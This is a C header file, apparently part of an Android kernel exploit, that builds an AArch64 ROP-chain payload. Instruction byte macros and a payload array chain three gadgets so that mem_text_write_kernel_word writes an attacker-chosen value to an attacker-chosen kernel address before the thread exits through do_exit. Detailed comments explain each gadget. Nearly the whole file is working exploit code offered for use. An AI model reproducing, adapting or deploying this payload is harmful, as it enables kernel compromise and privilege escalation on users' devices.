/*
 * payload.h
 *
 *  Created on: Aug 14, 2016
 *      Author: android
 */

#ifndef PAYLOAD_H_
#define PAYLOAD_H_

#include "payload_auto_defs.h"

#define FILLER 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

#define MOV_X0_0xFFFFFFFFFFFFFFFF  0x00, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X1_0xFFFFFFFFFFFFFFFF  0x01, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X2_0xFFFFFFFFFFFFFFFF  0x02, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X3_0xFFFFFFFFFFFFFFFF  0x03, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X4_0xFFFFFFFFFFFFFFFF  0x04, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X5_0xFFFFFFFFFFFFFFFF  0x05, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X6_0xFFFFFFFFFFFFFFFF  0x06, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X7_0xFFFFFFFFFFFFFFFF  0x07, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X8_0xFFFFFFFFFFFFFFFF  0x08, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X9_0xFFFFFFFFFFFFFFFF  0x09, 0x00, 0x80, 0x92, 0x00, 0x00, 0x00, 0x00
#define MOV_X0_0 0x00, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X1_0 0x01, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X2_0 0x02, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X3_0 0x03, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X4_0 0x04, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X5_0 0x05, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X6_0 0x06, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X7_0 0x07, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X8_0 0x08, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X9_0 0x09, 0x00, 0x80, 0xD2, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X0 0xF3, 0x03, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X1 0xF3, 0x03, 0x01, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X2 0xF3, 0x03, 0x02, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X3 0xF3, 0x03, 0x03, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X4 0xF3, 0x03, 0x04, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X5 0xF3, 0x03, 0x05, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X6 0xF3, 0x03, 0x06, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X7 0xF3, 0x03, 0x07, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X8 0xF3, 0x03, 0x08, 0xAA, 0x00, 0x00, 0x00, 0x00
#define MOV_X19_X9 0xF3, 0x03, 0x09, 0xAA, 0x00, 0x00, 0x00, 0x00

/* The actual payload.
 * Gadget 1: ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret;
 * 		This gadget loads SP + 0x10 into X19 and X20. We enter the gadget after incrementing SP by 0x30 (this was dictated by the returning function).
 * 		When returning from the gadget, X19 will be set to MEM_TEXT_WRITE_KERNEL_WORD (the address of the mem_text_write_kernel_word function)
 * 		and X20 will be set to the padding value.
 * 		Loading X20 is an unneeded side effect and exists only because the gadget contains it.
 *
 * Gadget 2: mov x2, x19 ; mov x0, x2 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x30 ; ret;
 * 		This gadget assigns the value of X19 into X2, The value of X2 into X0 and loads SP + 0x10 into X19 and X20. We enter the gadget after incrementing SP by 0x20.
 * 		When returning from the gadget, X2 and X0 will be set to MEM_TEXT_WRITE_KERNEL_WORD, X19 will be set to arg1 and X20 will be set to arg2.
 * 		arg1 and arg2 values are to be overwritten in the payload with pieces of the shellcode.
 * 		Assigning X0 is an unneeded side effect and exists only because the gadget contains it.
 *
 * Gadget 3: mov x0, x19 ; mov x1, x20 ; blr x2 ; ldp x19, x20, [sp, #0x10] ; ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret;
 * 		This gadget assigns the value of X19 into X0, The value of X20 into X1 and calls the function pointed by X2. We enter the gadget after incrementing SP by 0x30.
 * 		The gadget concludes by loading SP + 0x10 to X19 and X20 and loading SP + 0x20 to X21.
 * 		When the gadget calls X2 - X0 is set to arg1, X1 is set to arg2 and X2 is set to MEM_TEXT_WRITE_KERNEL_WORD. this causes the CPU to overwrite the word in
 * 		address arg1 with the word contained in arg2.
 * 		Loading X19 and X20 is an unneeded side effect and exists only because the gadget contains it.
 * 		The return address is set to DO_EXIT (the address of the function do_exit that quits the thread).
 *
 * Gadget 3 alt: mov x0, x19 ; mov x1, x20 ; blr x2 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret;
 * 		This gadget is an alternate version of gadget 3 that is not found in certain kernels.
 * 		The return address is located 0x10 below the one of Gadget 3 and therefore both addresses were initialized with DO_EXIT for compatibility.
 * */
const unsigned char payload[] =
{
		FILLER						,FILLER						,	// -0x10
		FILLER						,ROP_GADGET1_DIVIDED				,	// 0x00 - This should be aligned to the bottom of the frame  
		FILLER						,FILLER						,	// 0x10
		FILLER						,FILLER						,	// 0x20
		FILLER						,ROP_GADGET2_DIVIDED				,	// 0x30 - ROP1 stack
		MEM_TEXT_WRITE_KERNEL_WORD_DIVIDED	,FILLER						,	// 0x40
#ifdef ROP_GADGET3
		FILLER						,ROP_GADGET3_DIVIDED			,	// 0x50 - ROP2 stack
#else
		FILLER						,ROP_GADGET3_ALT_DIVIDED		,	// 0x50 - ROP2 stack
#endif
		OVERRUN_ADDR /*arg1 - where*/		,OVERRUN_VALUE /*arg2 - what*/		,	// 0x60
		FILLER						,FILLER						,	// 0x70
#ifdef ROP_GADGET3
		FILLER						,DO_EXIT_DIVIDED					,	// 0x80 - ROP3 stack
#else
		FILLER						,DO_EXIT_DIVIDED					,	// 0x80 - ROP3 stack
#endif

};

#endif /* PAYLOAD_H_ */
